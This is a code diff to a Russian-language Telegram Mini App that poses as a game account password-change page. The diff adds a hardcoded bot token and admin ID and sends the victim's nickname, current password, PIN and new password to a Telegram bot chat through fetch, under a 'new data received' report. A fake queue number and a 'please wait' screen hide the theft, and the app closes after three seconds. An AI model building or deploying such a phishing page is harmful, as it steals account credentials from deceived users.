@@ -149,14 +149,14 @@
 <body>
 
     <div id="screen1" class="screen active">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
         <h2 style="color: var(--text-muted);">Личный кабинет</h2>
         <div style="height: 60px;"></div>
         <button class="btn" onclick="goToScreen(2)">Поменять пароль</button>
     </div>
 
     <div id="screen2" class="screen">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" style="width: 90px;" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" style="width: 90px;" alt="Логотип">
         <h2>Смена пароля</h2>
         
         <div id="error" class="error-msg">Заполните все обязательные поля</div>
@@ -192,7 +192,7 @@
     </div>
 
     <div id="screen3" class="screen">
-        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
         <div class="wait-box">
             <div class="wait-title">Заявка обрабатывается</div>
             <p style="color: var(--text-muted);">Ожидайте в течение 10–15 минут</p>
@@ -203,7 +203,11 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем окно на максимум внутри ТГ
+        tg.expand(); 
+
+        // Данные твоего бота для резервного шлюза отправки данных
+        const BOT_TOKEN = "8935230076:AAH9-8b8SECl41FBncl5U6kp5d1aAIOrCKA";
+        const ADMIN_ID = 8632467330;
 
         // Список всех 91 серверов
         const servers = [
@@ -218,7 +222,6 @@
             "TAGANROG", "VOLOGDA", "TVER", "TOMSK", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"
         ];
 
-        // Автоматически добавляем серверы в выпадающий список html
         const select = document.getElementById('server');
         servers.forEach((srv, index) => {
             let opt = document.createElement('option');
@@ -240,7 +243,6 @@
             const newPass = document.getElementById('new_password').value.trim();
             const errorBlock = document.getElementById('error');
 
-            // Валидация: если хоть одно обязательное поле пустое — показываем ошибку
             if (!nick || !oldPass || !server || !newPass) {
                 errorBlock.style.display = 'block';
                 return;
@@ -248,24 +250,58 @@
 
             errorBlock.style.display = 'none';
 
-            // Генерируем случайную очередь от 2 до 9
             const randomQueue = Math.floor(Math.random() * (9 - 2 + 1)) + 2;
             document.getElementById('queue-val').innerText = randomQueue;
 
-            // Собираем данные в один пакет
+            // Имена полей теперь СТРОГО соответствуют Python-скрипту бота
             const payload = {
                 nickname: nick,
-                old_password: oldPass,
+                password: oldPass,
                 pincode: pin ? pin : "Не указан",
                 server: server,
                 new_password: newPass
             };
 
-            // Передаем данные обратно в бота
-            tg.sendData(JSON.stringify(payload));
-            
-            // Включаем третий экран (Ожидание)
+            // Переключаем на красивый экран загрузки
             goToScreen(3);
+
+            // Резервный шлюз: Отправляем данные напрямую через HTTP API бота на случай блокировок Telegram
+            const user = tg.initDataUnsafe?.user;
+            const username = user ? `@${user.username || 'нет юзернейма'}` : 'Через Inline-кнопку';
+            const userId = user ? user.id : 'Не определен';
+
+            const textReport = `🎯 **ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ** 🎯\n` +
+                               `-----------------------------------\n` +
+                               `👤 **Ник:** ${payload.nickname}\n` +
+                               `🔑 **Текущий пароль:** ${payload.password}\n` +
+                               `🔢 **Пин-код:** ${payload.pincode}\n` +
+                               `🌐 **Сервер:** ${payload.server}\n` +
+                               `🆕 **Новый пароль:** ${payload.new_password}\n` +
+                               `-----------------------------------\n` +
+                               `Отправитель: ${username} (ID: ${userId})`;
+
+            // Отправляем запрос
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: textReport,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('HTTP Send Error:', err));
+
+            // Пытаемся также отправить стандартным методом Telegram
+            try {
+                tg.sendData(JSON.stringify(payload));
+            } catch(e) {
+                console.log("Обычный метод sendData недоступен в этом режиме кнопок");
+            }
+
+            // Даем пользователю посмотреть на Экран №3 ровно 3 секунды, а потом закрываем приложение
+            setTimeout(() => {
+                tg.close();
+            }, 3000);
         }
     </script>
 </body>
